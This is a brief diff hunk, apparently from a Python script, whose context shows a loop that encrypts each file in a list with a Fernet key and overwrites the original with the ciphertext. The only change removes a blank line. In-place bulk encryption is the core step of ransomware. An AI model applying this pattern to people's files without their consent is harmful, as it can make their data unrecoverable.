@@ -22,4 +22,3 @@ for file in files:
   encrypted_src = Fernet(key).encrypt(contents)
   with open(file, "wb") as __file: 
     __file.write(encrypted_src)
-      
